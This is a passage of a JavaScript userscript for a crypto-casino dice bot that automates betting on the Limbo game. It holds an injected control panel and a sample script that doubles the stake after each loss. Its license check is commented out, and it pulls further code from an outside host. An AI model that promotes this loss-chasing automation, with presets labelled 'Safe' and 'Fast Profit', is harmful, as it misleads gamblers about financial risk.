const CASINO_GAME = 'Limbo';

window.WDB_ENV = 'production';
window.WDB_MODE = 'stable';
window.WDB_VERSION = 2023;
if (window.WDB_ENV === "development") {
  window.WDB_LIB = "http://localhost:8005";
} else {
  window.WDB_LIB = "https://lib.mhqb365.com";
}
const wdbLoadJS = function (cache) {
  let scriptCache = [];
  return function (url) {
    return scriptCache[url] || (scriptCache[url] = new Promise((resolve, reject) => {
      let scriptElement = document.createElement("script");
      scriptElement.defer = true;
      scriptElement.src = url;
      scriptElement.onload = resolve;
      scriptElement.onerror = reject;
      document.head.append(scriptElement);
    }));
  };
}();
const wdbLoadCSS = function (cache) {
  let cssCache = [];
  return function (url) {
    return cssCache[url] || (cssCache[url] = new Promise((resolve, reject) => {
      let linkElement = document.createElement("link");
      linkElement.defer = true;
      linkElement.rel = 'stylesheet';
      linkElement.type = "text/css";
      linkElement.href = url;
      linkElement.onload = resolve;
      linkElement.onerror = reject;
      document.head.append(linkElement);
    }));
  };
}();
/*function makeBoxEnterLicense() {
  const licenseBox = document.createElement('div');
  licenseBox.id = "wdbWrapLicenseBox";
  licenseBox.innerHTML = "\n      <style>\n        #wdbLicenseBox {\n          all: revert;\n          font-family: \"Courier New\", monospace;\n          font-size: 11px!important;\n          text-align: left;\n          background: #fff!important;\n          color: black!important;\n          line-height: 1.5!important;\n          top: 20px;\n          left: 20px;\n          padding: 5px;\n          position: absolute;\n          z-index: 2147483002;\n          border: 1px solid #ccc!important;\n          border-radius: 3px;\n        }\n\n        .wdb-input {\n          all: revert;\n          padding: 2px;\n          border: 1px solid #ccc;\n          border-radius: 3px;\n        }\n        \n        .btn-grad {\n          all: revert;\n          cursor: pointer;\n          background-image: linear-gradient(to right, #ffb347 0%, #ffcc33  51%, #ffb347  100%);\n          text-align: center;\n          transition: 0.5s;\n          padding: 3px;\n          background-size: 200% auto;\n          border: #ffc107;\n          border-radius: 3px;\n        }\n        \n        .btn-grad:hover {\n          background-position: right center;\n          text-decoration: none;\n        }\n        \n        .btn-grad:active {\n          opacity: .65;\n        }\n        \n        .btn-grad:disabled {\n          cursor: auto;\n          opacity: .65;\n          color: #fff;\n        }\n\n        #wdbLicenseAlert {\n          text-align: left!important;\n          color: red;\n          margin-top: 5px;\n        }\n      </style>\n\n      <div id=\"wdbLicenseBox\">\n        <div>Web DiceBot require your license</div>\n        <input type=\"text\" class=\"wdb-input\" id=\"wdbLicenseInput\" />\n        <button id=\"wdbLicenseButton\" class=\"btn-grad\">Save</button>\n        <div id=\"wdbLicenseAlert\">Maybe your license has expired</div>\n      </div>";
  document.body.prepend(licenseBox);
  setTimeout(() => {
    document.getElementById("wdbLicenseAlert").innerText = '';
  }, 2000);
  document.getElementById("wdbLicenseButton").onclick = () => {
    const licenseInput = document.getElementById('wdbLicenseInput').value;
    if (!licenseInput) {
      document.getElementById("wdbLicenseAlert").innerText = "Enter your license";
      setTimeout(() => {
        document.getElementById("wdbLicenseAlert").innerText = '';
      }, 2000);
    } else if (licenseInput.length !== 36) {
      document.getElementById("wdbLicenseAlert").innerText = "Wrong license";
      setTimeout(() => {
        document.getElementById("wdbLicenseAlert").innerText = '';
      }, 2000);
    } else {
      localStorage.setItem("license", licenseInput);
      document.getElementById('wdbLicenseAlert').style.color = "green";
      document.getElementById("wdbLicenseAlert").innerText = "License saved\nInitializing...";
      setTimeout(init, 500);
    }
  };
}*/
async function init() {
  try {
    /*const license = localStorage.getItem("license");
    if (!license) {
      return makeBoxEnterLicense();
    }
    const initializingDiv = document.createElement("div");
    initializingDiv.id = "wdbWrapInitializing";
    initializingDiv.innerHTML = "\n      <style>\n        #wdbInitializing {\n          all: revert;\n          font-family: \"Courier New\", monospace;\n          font-size: 11px!important;\n          text-align: left;\n          background: #fff!important;\n          color: black!important;\n          line-height: 1.5!important;\n          top: 20px;\n          left: 20px;\n          padding: 5px;\n          position: absolute;\n          z-index: 2147483002;\n          border: 1px solid #ccc!important;\n          border-radius: 3px;\n        }\n      </style>\n\n      <div id=\"wdbInitializing\">\n        Web DiceBot initializing...\n      </div>";
    document.body.prepend(initializingDiv);
    const wdbAPI = WDB_API + '/' + WDB_MODE + '/main/' + CASINO_GAME + "?license=" + license;
    await wdbLoadJS(wdbAPI);*/
    await wdbLoader(wdbLoadJS, wdbLoadCSS);
  } catch (error) {
    /*if (document.getElementById("wdbLicenseBox")) {
      document.getElementById("wdbLicenseBox").remove();
    }
    if (document.getElementById("wdbInitializing")) {
      document.getElementById("wdbInitializing").remove();
    }
    makeBoxEnterLicense();*/
	console.error('Initialization failed', error);
  }
}
init();

// Remove the fetch for ms.js since it's now included directly
// await fetchFunc(WDB_LIB + '/ms.js');
/*class MySpeed {
  constructor(seconds, bets, speed) {
    this.seconds = seconds || 0;
    this.bets = bets || 0;
    this.speed = speed || 0;
  }
  start() {
    this.interval = setInterval(() => {
      this.seconds++;
      this.speed = Math.floor((this.bets / this.seconds) * 100) / 100;
      document.getElementById("wdbSpeed").innerText = this.speed;
    }, 1e3);
  }
  pause() {
    clearInterval(this.interval);
  }
  stop() {
    this.seconds = 0;
    this.bets = 0;
    this.speed = 0;
  }
}*/
// End of ms.js code

Object.defineProperty(String.prototype, "capitalize", {
  'value': function () {
    return this.charAt(0).toUpperCase() + this.slice(1);
  },
  'enumerable': false
});
isWagerSwitch = false;
client = null;
darkMode = false;
mode = "js";
game = 'dice';
run = false;
win = false;
sOW = false;
minbet = 0;
maxbet = 0;
startBalance = 0;
percentWagered = 0;
percentProfit = 0;
luaEditor = null;
jsEditor = null;
stopHistory = false;
stopLog = false;
stopChart = false;
maxRows = 200;
chart = null;
betsChart = 0;
profitChart = 0;
dps = [];
coins = [];
coin = null;
currency = null;
casino = null;
balance = 0;
minbalance = 0;
maxbalance = 0;
minprofit = 0;
maxprofit = 0;
basebet = 0;
nextbet = 0;
chance = 0;
havePlinkoRows = false;
plinkoRow = 8;
plinkoRisk = "low";
bethigh = true;
target = 0;
result = 0;
bets = 0;
wins = 0;
losses = 0;
profit = 0;
wagered = 0;
maxBetAmount = 0;
maxLosseAmount = 0;
currentprofit = 0;
partialprofit = 0;
winstreak = 0;
losestreak = 0;
currentstreak = 0;
maxwinstreak = 0;
maxlosestreak = 0;
previousbet = 0;
lastBet = {
  'amount': 0,
  'Amount': 0,
  'chance': 0,
  'Chance': 0,
  'roll': 0,
  'Roll': 0,
  'profit': 0,
  'Profit': 0,
  'target': 0,
  'Target': 0,
  'result': 0,
  'Result': 0,
  'nonce': 0,
  'Nonce': 0,
  'id': '',
  'Id': ''
};
scriptname = '';
decimalAmountView = 8;
decimalChanceView = 2;
decimalTargetResult = 2;
wdbSpeed = null;
wdbTimer = null;
wdbSound = new Object(new Audio(WDB_LIB + "/ching.mp3"));
wdbUI = `
    <style>
        ::-webkit-scrollbar {
          width: 8px;
          height: 8px;
        }
        
        ::-webkit-scrollbar-track {
          background: #f1f1f1;
        }
        
        ::-webkit-scrollbar-thumb {
          background: #888;
        }
        
        ::-webkit-scrollbar-thumb:hover {
          background: #555;
        }
        
        #wdb {
            all: revert;
            height: auto;
            max-width: 90%;
            font-family: monospace;
            font-size: 11px !important;
            text-align: left;
            background: #fff;
            color: #000;
            line-height: 1.5 !important;
            top: 5px;
            left: 5px;
            padding: 5px;
            position: absolute;
            z-index: 2147483002;
            border: 1px solid #ccc;
            border-radius: 3px;
            background-color: LemonChiffon;
            display: flex;
            flex-direction: column;
        }
        
        #wdbHeader,
        #wdbFooter {
          cursor: move;
        }

        #botIcon {
          width: auto;
          height: 35px;
          display: block;
          margin: 0 auto; /* Center the image */
          margin-bottom: 10px;
        }
        
        .wdb-toggle {
          width: 30px;
          height: 30px;
          display: inline-block;
          position: relative;
          cursor: pointer;
          z-index: 1000;
        }
    
        .wdb-toggle i {
          position: absolute;
          display: block;
          height: 3px;
          background: black;
          width: 30px;
          left: 0px;
          -webkit-transition: all .3s;
          transition: all .3s;
        }
    
        .wdb-toggle.active i:nth-child(1) {
          top: 16px;
          -webkit-transform: rotateZ(0deg);
          transform: rotateZ(0deg);
        }
    
        .wdb-toggle.active i:nth-child(2) {
          top: 24px;
          background: black;
          -webkit-transform: rotateZ(0deg);
          transform: rotateZ(0deg);
        }
    
        .wdb-toggle.active i:nth-child(3) {
          top: 32px;
          -webkit-transform: rotateZ(0deg);
          transform: rotateZ(0deg);
        }
    
        .wdb-toggle i:nth-child(1) {
          top: 25px;
          -webkit-transform: rotateZ(45deg);
          transform: rotateZ(45deg);
        }
    
        .wdb-toggle i:nth-child(2) {
          background: transparent;
        }
    
        .wdb-toggle i:nth-child(3) {
          top: 25px;
          -webkit-transform: rotateZ(-45deg);
          transform: rotateZ(-45deg);
        }
        
        #wdbMenu {
          padding: 3px;
        }
        
        #wdbMenu select,
        #wdbMenu span input[type=number] {
          all: revert;
          background: white!important;
          padding: 3px 5px;
          border: 1px solid #ccc!important;
          border-radius: 0!important;
          border-radius: 3px!important;
        }
        
        #wdbMenu span input[type=number] {
          width: 86px;
        }
        
        #wdbMenu select:focus {
          color: black!important;
        }
        
        .switch {
          position: relative;
          display: inline-block;
          width: 25px;
          height: 12px;
        }
        
        .switch input { 
          opacity: 0;
          width: 0;
          height: 0;
        }
        
        .slider {
          all: revert;
            background: white;
          position: absolute;
          cursor: pointer;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          border-radius: 1.6px;
          -webkit-transition: .4s;
          transition: .4s;
        }
        
        .slider:before {
          content: "";
          position: absolute;
          background: black;
          height: 7.2px;
          width: 7.2px;
          left: 1.6px;
          bottom: 2.17px;
          border-radius: 1.9px;
          -webkit-transition: .3s;
          transition: .3s;
        }
        
        input:checked+.slider {
          background-color: white;
        }
        
        input:focus+.slider {
          box-shadow: 0 0 1px white;
        }
        
        input:checked+.slider:before {
            -webkit-transform: translateX(14.4px);
            -ms-transform: translateX(14.4px);
            transform: translateX(14.4px);
        }
        
        /* Rounded sliders */
        .slider.round {
            border-radius: 21.15px;
        }
        
        .slider.round:before {
            border-radius: 50%;
        }
        
        .btn-grad {
          all: revert;
          cursor: pointer;
          text-align: center;
          transition: 0.5s;
          padding: 0.5px 1px; /* Adjust padding */
          font-size: 12px; /* Adjust font size */
          background-size: 200% auto;
          border-radius: 3px;
          border: 1px solid #ccc; /* Optional: border to define button edge */
        }
        
        .btn-grad:hover {
          background-position: right center;
          text-decoration: none;
        }
        
        .btn-grad:active {
          opacity: .65;
        }
        
        .btn-grad:disabled {
          cursor: auto;
          opacity: .65;
          color: #fff;
        }
        
        #wdbOpenLUAScript,
        #wdbOpenJSScript {
          all: revert;
        }
        
        #wdbChart,
        #wdbWrapHistory {
          height: 200px;
          overflow: hidden;
          padding: 3px;
        }
        
        #wdbWrapHistory {
          overflow-x: auto;
          width: 100%; /* Ensures the container uses the full width of its parent */
        }
        
        #wdbWrapHistory table {
          border-collapse: collapse;
          width: 100%; /* Makes the table fit the container's width */
        }
        
        #wdbWrapHistory table thead tr th {
          font-weight: normal;
          text-align: left;
          padding: 1px;
          border: 1px solid #ccc;
          white-space: nowrap;
          color: #000;
        }
        
        #wdbHistory tr {
          border-bottom: 1px solid #fff;
          color: #000!important;
        }
        
        #wdbHistory tr:last-child {
          border-bottom: 1px solid #ccc;
        }
        
        #wdbHistory tr td {
          all: revert;
          white-space: nowrap;
          padding: 1.5px;
          border-right: 1px solid #fff;
          border-left: 1px solid #fff;
        }
        
        #wdbHistory tr td:first-child {
          border-left: 1px solid #ccc;
        }
        
        #wdbHistory tr td:last-child {
          border-right: 1px solid #ccc;
        }
        
        #wdbHistory tr td input {
          all: revert;
        }
        
        #wdbAdvancedMode,
        #wdbWrapLog,
        #wdbWrapVariables,
        #wdbWrapFunctions,
        #wdbWrapTips {
          overflow: scroll;
          height: 300px;
        }
        
        #wdbWrapVariables pre,
        #wdbWrapFunctions pre,
        #wdbWrapTips pre {
          all: revert;
          background: #fff;
          color: #000;
          margin: 0;
        }
        
        #wdbWrapLog code {
          all: revert;
        }
        
        #wdbLog li {
          list-style: none;
          padding-left: 0;
        }
        
        #wdbOpenScript {
          all: revert;
        }
        
        .wdb-stats-btn {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            /* Center children horizontally */
        }
        
        .wdb-stats-btn div {
            flex-grow: 1;
            padding: 2px 32px;
        }
        
        .wdb-stats-btn div li {
            list-style: none;
        }
        
        .wdb-stats,
        .wdb-flex-container {
          display: flex;
          flex-wrap: wrap;
          align-items: stretch;
        }
        
        .wdb-stats div {
          flex-grow: 1;
          padding: 2px 32px;
        }
        
        .wdb-stats div li {
          list-style: none;
        }
        
        .wdb-advanced-item {
          line-height: 2;
          padding: 3px 0;
          border-bottom: 1px solid #e7e7e7;
        }
        
        .wdb-advanced-item:last-child {
          border: none;
        }
        
        .wdb-advanced-item input {
          all: revert;
        }
        
        .wdb-advanced-item input[type=number] {
          width: 86px;
        }
        
        .clearfix::after {
          content: "";
          clear: both;
          display: table;
        }
        
        .float-left {
          float: left!important;
        }
        
        .float-right {
          float: right!important;
        }
        
        .wdb-menu2 {
          display: flex;
          flex-wrap: wrap;
        }
        
        .wdb-menu2 span {
          padding: 3.5px;
          text-align: center;
        }
        
        #wdbTabMenu,
        #wdbControlMenu {
            display: flex;
            flex-wrap: wrap;
            margin-top: 3px;
        }
        
        #wdbTabMenu button,
        #wdbControlMenu button {
          flex-basis: 0;
          flex-grow: 1;
          margin: 3px;
        }
        
        .CodeMirror {
          height: 269px;
        }
        </style>
        
        <div id="wdb">
          <div id="wdbHeader">
            <div class="float-left">
                <span style="margin-top: -10px;" class="wdb-toggle" id="wdbToggleMinimal" onclick="toggleMinimalBot(this)">
                    <i></i>
                    <i></i>
                    <i></i>
                  </span>
              </div>
              <div id="botIconContainer">
                <img src="https://raw.githubusercontent.com/provablyDice/LogoGIF/main/PCB_Header_Logo_GIF.gif" alt="PCB Logo" id="botIcon" />
              </div>
            <div class="clearfix">
                <div style="float: right;"></div>
            </div>
          </div>
        
          <div id="wdbMain">
            <div id="wdbMenu">
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <select style="font-size: 12px; padding: 0.5px 1px;" id="wdbGameMode" class="wdb-select">
                    <option value="dice">Limbo</option>
                  </select>
              </span>
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <select style="font-size: 12px; padding: 0.5px 1px;" id="wdbMenuCoin" class="wdb-select" onchange='changeCoin()'>
                    <option>Loading...</option>
                </select>
              </span>
              <span>
                Dark Mode:
                <label class="switch">
                  <input type="checkbox" onchange="toggleDarkMode()">
                  <span class="slider round"></span>
                </label>
              </span>
              <span>
                Bet Speed: <span id="wdbSpeed">0</span>
              </span>
              <span id="scriptName"></span>
            </div>
        
            <div class="wdb-menu2">
                <div class="wdb-stats-btn">
                    <span style="padding-top: 6px; padding-bottom: 10px;">
                      Bet:<select id="wdbBaseBet" style="width: 50px; background-color: white; font-size: 11px;"
                        class="btn-grad btn-control">
                          <option value="0.00000010">Safe</option>
                          <option value="0.00000050">Basic x 5</option>
                          <option value="0.00000100">Basic x 10</option>
                          <option value="0.00000200">Basic x 20</option>
                          <option value="0.00000500">Risk</option>
                          <option value="0.00001000">Risk x 2</option>
                          <option value="0.00002000">Risk x 4</option>
                          <option value="0.00005000">Fast Profit/Loss</option>
                      </select>
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    Profit:<input id="profitPercent" type="text" style="width: 30px; background-color: white;"
                      class="btn-grad btn-control" value="1">%
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button style="background-color: white;" class="btn-grad btn-control"
                      onclick="botGuide()" aria-label="Open Bot Guide">Bot Guide!</button>
                  </span>
                  <span style="padding-top: 7px; padding-bottom: 10px;">
                      📈:
                    <label class="switch">
                      <input id="wdbToggleHideControlBot" type="checkbox" onclick="toggleHideControlBot(this)">
                      <span class="slider round"></span>
                    </label>
                  </span>
                </div>
                <div class="wdb-stats-btn">
                  <span style="padding-top: 7px; padding-bottom: 10px;">
                    Wager Mode:
                    <label class="switch">
                      <input id="wagerSwitch" type="checkbox" onchange="updateWagerSwitch()">
                      <span class="slider round"></span>
                    </label>
                    </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    Max Bet Amount:<input id="maxBetLimit" type="number"
                    style="width: 86px; background-color: white;" class="btn-grad btn-control"
                    value="0.00000000">
                  </span>
                </div>
                <div class="wdb-stats-btn">
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    Mode:<select id="strategyRisk" style="width: 50px; background-color: white; font-size: 11px;"
                    class="btn-grad btn-control">
                      <option value="7">Safe</option>
                      <option value="6">Normal</option>
                      <option value="5">Fast</option>
                      <option value="4">Ultra Fast</option>
                      <option value="3">Turbo</option>
                    </select>
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button id="wdbStartButton" style="background-color: Lime;" class="btn-grad btn-control"
                      onclick="start('click')">Start</button>
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button id="wdbStopButton" style="background-color: Tomato;" class="btn-grad btn-control"
                      onclick="stop()">Stop</button>
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button id="wdbResumeButton" style="background-color: gainsboro;" class="btn-grad btn-control"
                      onclick="resume('click')" disabled>Resume</button>
                  </span>
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button id="wdbStopOnWinButton" style="background-color: white;" class="btn-grad btn-control"
                      onclick="stopOnWin()">On Win [Stop]</button>
                  </span>
                </div>
                <div class="wdb-stats-btn">
                  <span style="padding-top: 6px; padding-bottom: 10px;">
                    <button style="background-color: white;" class="btn-grad btn-control" onclick="checkbalance()">Refresh
                      Balance</button>
                  </span>
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <button style="background-color: white;" class="btn-grad btn-control" onclick="selectFunction('resetstats')">Refresh Stats</button>
              </span>
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <button style="background-color: white;" class="btn-grad btn-control" onclick="selectFunction('resetchart')">Refresh Chart</button>
              </span>
                </div>
                <div class="wdb-stats-btn">
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <button style="background-color: white;" class="btn-grad btn-control" onclick="selectFunction('resethistory')">Refresh Bets</button>
              </span>
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <button style="background-color: white;" class="btn-grad btn-control" onclick="selectFunction('resetseed')">Reset Seed</button>
              </span>
              <span style="padding-top: 6px; padding-bottom: 10px;">
                <button style="background-color: white;" class="btn-grad btn-control" onclick="selectFunction('resetall')">Refresh Bot</button>
                    </span>
                </div>
            </div>
        
            <div class="wdb-stats" id="wdbStats">
              <div>
                <li class="clearfix">
                    <span class="float-left">TIME:</span>
                    <span class="float-right"><span id="wdbTime">0:0:0:0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">WAGERED:</span>
                    <span class="float-right">(<span id="wdbPercentWagered">0.00</span>x) <span
                        id="wdbWagered">0.00000000</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">BALANCE:</span>
                    <span class="float-right"><span id="wdbBalance">0.00000000</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">PROFIT:</span>
                    <span class="float-right" id="wdbWrapPercentProfit">(<span id="wdbPercentProfit">0.00</span>%) <span
                        id="wdbProfit">0.00000000</span></span>
                  </li>
                </div>
        
                <div>
                  <li class="clearfix">
                    <span class="float-left">WEBSITE:</span>
                    <span class="float-right"><span id="wdbWebsite">..LOADING</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">CRYPTOCURRENCY:</span>
                    <span class="float-right"><span id="wdbCryptoCurrency">COIN</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST BALANCE:</span>
                    <span class="float-right"><span id="wdbMaxBalance">0.00000000</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST PROFIT:</span>
                    <span class="float-right"><span id="wdbMaxProfit">0.00000000</span></span>
                  </li>
                </div>
        
                <div>
                  <li class="clearfix">
                    <span class="float-left">BETS:</span>
                    <span class="float-right"><span id="wdbBets">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">WINS:</span>
                    <span class="float-right"><span id="wdbWins">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">LOSSES:</span>
                    <span class="float-right"><span id="wdbLosses">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST BET:</span>
                    <span class="float-right"><span id="wdbHighBet">0.00000000</span></span>
                  </li>
                </div>
        
                <div>
        
                  <li class="clearfix">
                    <span class="float-left">CURRENT STREAK:</span>
                    <span class="float-right"><span id="wdbCurrentStreak">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST WIN STREAK:</span>
                    <span class="float-right"><span id="wdbHighWinStreak">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST LOSE STREAK:</span>
                    <span class="float-right"><span id="wdbHighLoseStreak">0</span></span>
                  </li>
                  <li class="clearfix">
                    <span class="float-left">HIGHEST LOSE:</span>
                    <span class="float-right"><span id="wdbHighLose">0.00000000</span></span>
                  </li>
              </div>
            </div>
        
            <div class="wdb-flex-container" id="wdbWrapControl">
              <div style="flex-grow: 1; width: 100%;">
                <div id="wdbChart"></div>
        

              </div>
        
              <div style="flex-grow: 1; width: 50%; padding-left: 5px;">
                <div id="wdbTabMenu">
                  <button class="btn-grad" id="wdbShowMode" onclick="toggleNav('mode')">Mode</button>
                  <button class="btn-grad" id="wdbShowLog" onclick="toggleNav('log')">Log</button>
                  <button class="btn-grad" id="wdbShowVariables" onclick="toggleNav('variables')">Variables</button>
                  <button class="btn-grad" id="wdbShowFunctions" onclick="toggleNav('functions')">Functions</button>
                  <button class="btn-grad" id="wdbShowTips" onclick="toggleNav('tips')">Tips</button>
                </div>
        
                <div>
                  <div id="wdbWrapMode">
                    <div id="wdbJSMode">
                      <div style="padding: 5px 2px 5px">
                        <button class="btn-grad" id="wdbSaveScriptButton" onclick="saveScript()">Save</button>
                        <input style="margin: 0 3px;" type="file" id="wdbOpenJSScript" accept=".txt, .js" />
                      </div>
                      <textarea id="wdbScriptBoxJS">
                      
                        </textarea>
                    </div>
        
                    <div id="wdbLUAMode">
                        <div style="padding: 5px 2px 5px">
                          <button class="btn-grad" id="wdbSaveScriptButton" onclick="saveScript()">Save</button>
                          <input style="margin: 0 3px;" type="file" id="wdbOpenLUAScript" accept=".txt, .lua" />
                        </div>
                        <textarea id="wdbScriptBoxLUA">scriptname='example LUA script'
          chance=49.5
          bethigh=true
          basebet=0.00000001
          nextbet=basebet
          -- currency='trx'
          -- log(casino)
          -- plinkoRow=8 -- depend dice site, only for plinko game
          -- plinkoRisk='low' -- low, medium, high; only for plinko game
          
          function dobet()
            -- log('profit: '..profit)
            -- sleep(0.2)
            if (win) then
              nextbet=basebet
            else
              nextbet=previousbet*2
            end
          end</textarea>
                      </div>
          
                      <div id="wdbAdvancedMode" class="wdb-advanced">
                      <div class="wdb-advanced-item">
                        Chance <input type="number" id="advancedChance" value="49.5" />
                      </div>
        
                      <div class="wdb-advanced-item">
                        Base bet
                        <input type="number" id="advancedBaseBet" value="0.00000001" />
                      </div>
        
                      <div class="wdb-advanced-item">
                        Bethigh
                        <input type="checkbox" id="advancedBetHigh" checked />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedChanceOnWinCheck" />
                        Set chance to
                        <input type="number" value="45.5" id="advancedChanceOnWin" />
                        on
                        <input type="number" value="1" id="advancedChanceOnWinBets" />
                        win
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedChanceOnLoseCheck" />
                        Set chance to
                        <input type="number" value="50.5" id="advancedChanceOnLose" />
                        on
                        <input type="number" value="1" id="advancedChanceOnLoseBets" />
                        lose
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedMultiOnWinCheck" />
                        Multiplier
                        <input type="number" id="advancedMultiOnWin" value="2" />
                        on
                        <input type="number" id="advancedMultiOnWinBets" value="1" />
                        win
                      </div>
                      
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedMultiOnLoseCheck" checked/>
                        Multiplier
                        <input type="number" id="advancedMultiOnLose" value="2" />
                        on
                        <input type="number" id="advancedMultiOnLoseBets" value="1" />
                        lose
                      </div>
                      
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedBetHighOnBetCheck" />
                        Switch bethigh on
                        <input type="number" value="1" id="advancedBetHighOnBet" />
                        bet
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedBetHighOnWinCheck" />
                        Switch bethigh on
                        <input type="number" value="1" id="advancedBetHighOnWin" />
                        win
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedBetHighOnLoseCheck" />
                        Switch bethigh on
                        <input type="number" value="1" id="advancedBetHighOnLose" />
                        lose
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedBetHighOnProfitCheck" />
                        Switch bethigh on profit
                        <input
                          type="number"
                          value="0.00000010"
                          id="advancedBetHighOnProfit"
                          class="wdb--input wdb-w-40"
                        />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="resetstatsOnProfitCheck" />
                        Reset stats on profit
                        <input
                          type="number"
                          value="0.00000010"
                          id="resetstatsOnProfit"
                          class="wdb--input wdb-w-40"
                        />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedStopRollNumberCheck" />
                        Stop on roll number
                        <input type="number" value="49.5" id="advancedStopRollNumber" />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedStopAfterStreakCheck" />
                        Stop on current streak
                        <input type="number" value="-2" id="advancedStopAfterStreak" />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedStopOnBetsCheck" />
                        Stop on
                        <input type="number" value="10" id="advancedStopOnBets" /> bet
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedStopOnWinsCheck" />
                        Stop on
                        <input type="number" value="1" id="advancedStopOnWins" /> win
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="advancedStopOnLoseCheck" />
                        Stop on
                        <input type="number" value="1" id="advancedStopOnLose" /> lose
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="stopOnProfitCheck" />
                        Stop on profit
                        <input type="number" value="0.00000010" id="stopOnProfit" />
                      </div>
        
                      <div class="wdb-advanced-item">
                        <input type="checkbox" id="stopOnBalanceCheck" />
                        Stop on balance
                        <input type="number" value="0.00000010" id="stopOnBalance" />
                      </div>
                    </div>
                  </div>
        
                  <div id="wdbWrapLog">
                    <code id="wdbLog"></code>
                  </div>
        
                  <div id="wdbWrapVariables">
                    <pre>chance : % win chance in next game
        plinkoRow : Plinko rows, only for plinko game, some site not have
        plinkoRisk : risk level for plinko game (low, medium, high)
        bethigh : Bet side in next game (true is over/above, false is under/below)
        minbet : Minimum amount to bet
        maxbet : Maximum amount to bet
        nextbet : Amount in next game
        lastBet.amount, previousbet : Amount in previous game
        lastBet.chance : % win chance in previous game
        lastBet.roll : % roll chance in previous game
        lastBet.target : Target number in previous game (some sites have)
        lastBet.result : Result number in previous game (some sites have)
        lastBet.profit, currentprofit : Profit in previous game
        lastBet.nonce : Current seed nonce
        lastBet.id : Bet ID in previous game
        currency : Currency to play (some site not work)
        balance : Current balance
        minbalance : Smallest balance in session
        maxbalance : Biggest balance in session
        minprofit : Smallest profit in session
        maxprofit : Biggest profit in session
        profit : Session profit
        wagered : Session wagered
        win : State in previous game (true is win, false is lose)
        bets : Bet count
        wins : Win count
        winstreak  : Winning streak
        losses : Lose count
        losestreak : Losing streak
        currentstreak : Current streak (smaller 0 is losing streak and vice versa)
        partialprofit : Partial profit (same in other dicebot)
        scriptname : Name of script u use
        casino : Name of casino (example: 500.casino = 500; bch.games = bch)</pre>
                  </div>
        
                  <div id="wdbWrapFunctions">
        <pre>dobet() : Main function for betting
        stop() : Stop betting
        resume() : Resume betting with current params
        resetseed() : Reset fairness
        resetstats() : Reset statistics
        resetchart() : Reset chart
        resethistory() : Reset history
        resetlog() : Reset log
        resetall() : Reset time, statistics, chart, history, log
        checkbalance() : Check actual balance
        ching() : Alert with sound
        log(message) : Write a message in Log area
        sleep(sec) : Pause betting system with sec
        resetpartialprofit() : Reset partialprofit</pre>
                  </div>
        
                  <div id="wdbWrapTips">
                    <pre>Click ▼ or ▲ on to see something change
        Disable chart, history, log to have best performance
        Hold top or bottom area to move the bot around
        Please check minimum bet size at dice site
        Extensions: github.com/webdicebot-project/extensions</pre>
                  </div>
                </div>
        
                <div id="wdbControlMenu">
                  <button id="wdbStartButton" class="btn-grad btn-control" onclick="start('click')">Start</button>
                  <button id="wdbStopButton" class="btn-grad btn-control" onclick="stop()">Stop</button>
                  <button id="wdbResumeButton" class="btn-grad btn-control" onclick="resume('click')" disabled>Resume</button>
                  <button id="wdbStopOnWinButton" class="btn-grad btn-control" onclick="stopOnWin()">Stop On Win</button>
                  <button class="btn-grad btn-control" onclick="checkbalance()">Check Balance</button>
                </div>

                <div id="wdbWrapHistory">
                    <table>
                      <thead>
                        <tr>
                          <th id="wdbWrapHistory-th" style="background-color: white;">BETS</th>
                          <th id="wdbWrapHistory-th" style="background-color: white;">AMOUNT</th>
                          <th id="wdbWrapHistory-th" style="background-color: white;">TARGET</th>
                          <th id="wdbWrapHistory-th" style="background-color: white;">RESULT</th>
                          <th id="wdbWrapHistory-th" style="background-color: white;">PROFIT</th>
						  <th id="wdbWrapHistory-th" style="background-color: white;">NONCE</th>
                        </tr>
                      </thead>
